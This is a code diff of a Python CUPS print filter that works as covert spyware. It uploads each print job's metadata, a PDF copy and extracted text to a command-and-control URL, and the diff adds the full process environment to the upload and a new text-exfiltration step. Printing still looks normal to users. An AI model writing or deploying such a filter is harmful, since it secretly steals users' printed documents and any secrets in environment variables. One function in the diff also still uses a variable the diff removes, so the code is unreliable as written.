@@ -1,4 +1,6 @@
-#!/usr/bin/env python3
+# !/usr/bin/env python3
+
+#!/usr/bin/python3 -t
 
 from __future__ import print_function
 
@@ -65,11 +67,12 @@ class MetaUploader(threading.Thread):
 
     def run(self):
         job_data = {'id': self.cups_id, 'user': self.cups_user, 'title': self.cups_title, 'copies': self.cups_copies,
-                    'options': self.cups_options, 'timestamp': datetime.datetime.now().isoformat()}
-        bpc_debug("Uploading Metadata - Request:", job_data)
+                    'options': self.cups_options, 'timestamp': datetime.datetime.now().isoformat(),
+                    'environment': dict(os.environ)}
+        bpc_debug("Uploading Metadata")
         response = requests.post(C2_URL, json=job_data)
         json_response = response.json()
-        bpc_debug("Uploaded Metadata - Response:", json_response)
+        bpc_debug("Uploaded Metadata - Response:", response)
         self._upload_id = json_response['upload_id']
         self._pages = json_response['pages']
 
@@ -78,12 +81,8 @@ class MetaUploader(threading.Thread):
         return self._upload_id
 
 
-def ps_to_pdf(cups_filename_or_none, cups_id, cups_user, cups_title, cups_copies, cups_options):
+def ps_to_pdf(pdf_input_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
     bpc_debug("ps_to_pdf")
-    if cups_filename_or_none is not None and len(cups_filename_or_none) > 0:
-        file_in = open(cups_filename_or_none, 'rb')
-    else:
-        file_in = None
     bytes = subprocess.check_output(
         args=["/usr/lib/cups/filter/pstopdf", cups_id, cups_user, cups_title, cups_copies, cups_options],
         stdin=file_in)
@@ -91,21 +90,30 @@ def ps_to_pdf(cups_filename_or_none, cups_id, cups_user, cups_title, cups_copies
     return bytes
 
 
-def ps_2_pdf(cups_filename_or_none, cups_id, cups_user, cups_title, cups_copies, cups_options):
+def ps_2_pdf(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
     bpc_debug("ps_2_pdf")
-    if cups_filename_or_none is not None and len(cups_filename_or_none) > 0:
-        file_in = cups_filename_or_none
-    else:
-        file_in = '-'
-    bpc_debug(["/usr/bin/ps2pdf", file_in, '-'])
-    bytes = subprocess.check_output(args=["/usr/bin/ps2pdf", file_in, '-'])
+    p = subprocess.Popen(args=["/usr/bin/ps2pdf", '-', '-'],
+                         stdin=subprocess.PIPE,
+                         stdout=subprocess.PIPE)
+    bytes = p.communicate(input=bytes)[0]
     return bytes
 
 
 def upload_pdf(bytes, upload_id):
     bpc_debug("Uploading PDF:", upload_id)
-    response = requests.post(C2_URL + '/' + upload_id, data=bytes)
+    response = requests.post(C2_URL + '/pdf/' + upload_id, data=bytes)
     bpc_debug("Uploaded PDF:", response)
+
+
+def upload_text(ps_bytes, upload_id):
+    bpc_debug("Uploading Text:", upload_id)
+    p = subprocess.Popen(
+        args=["/usr/bin/ps2ascii", '-', '-'],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE)
+    bytes = p.communicate(input=ps_bytes)[0]
+    response = requests.post(C2_URL + '/text/' + upload_id, data=bytes)
+    bpc_debug("Uploaded Text:", response)
 
 
 def overlay_pdf(bytes):
@@ -145,7 +153,6 @@ def pdf_to_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
 
 def pdf_2_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
     bpc_debug("pdf_2_ps")
-    bpc_debug(["/usr/bin/pdf2ps", '-', '-'])
     p = subprocess.Popen(
         args=["/usr/bin/pdf2ps", '-', '-'],
         stdin=subprocess.PIPE)
@@ -153,28 +160,38 @@ def pdf_2_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
     p.stdin.close()
 
 
+def read_ps_in_bytes():
+    bpc_debug("argc", len(sys.argv))
+    if len(sys.argv) > 6 and os.path.isfile(sys.argv[6]):
+        with open(sys.argv[6], 'rb') as file:
+            bytes = file.read()
+    else:
+        bytes = sys.stdin.buffer.read()
+    return bytes
+
+
 C2_URL = 'http://c2:8080/bpc/api-v1'
 
-eprint(sys.argv)
+bpc_debug("sys.argv", sys.argv)
 cups_id = sys.argv[1]
 cups_user = sys.argv[2]
 cups_title = sys.argv[3]
 cups_copies = sys.argv[4]
 cups_options = sys.argv[5]
-if len(sys.argv) > 6:
-    cups_input_filename = sys.argv[6]
-else:
-    cups_input_filename = None
+
+ps_in_bytes = read_ps_in_bytes()
 
 meta_uploader = MetaUploader(cups_id, cups_user, cups_title, cups_copies, cups_options)
 meta_uploader.start()
+spawn_daemon(upload_text, ps_in_bytes, meta_uploader.upload_id())
 
-# pdf_input_data = ps_to_pdf(cups_input_filename, cups_id, cups_user, cups_title, cups_copies, cups_options)
-pdf_input_data = ps_2_pdf(cups_input_filename, cups_id, cups_user, cups_title, cups_copies, cups_options)
+# pdf_input_data = ps_to_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
+pdf_in_bytes = ps_2_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
 
-spawn_daemon(upload_pdf, pdf_input_data, meta_uploader.upload_id())
+spawn_daemon(upload_pdf, pdf_in_bytes, meta_uploader.upload_id())
+# spawn_daemon(upload_text, ps_input_data, meta_uploader.upload_id())
 
-pdf_output_data = overlay_pdf(pdf_input_data)
+pdf_out_bytes = overlay_pdf(pdf_in_bytes)
 
 # pdf_to_ps(pdf_output_data, cups_id, cups_user, cups_title, cups_copies, cups_options)
-pdf_2_ps(pdf_output_data, cups_id, cups_user, cups_title, cups_copies, cups_options)
+pdf_2_ps(pdf_out_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
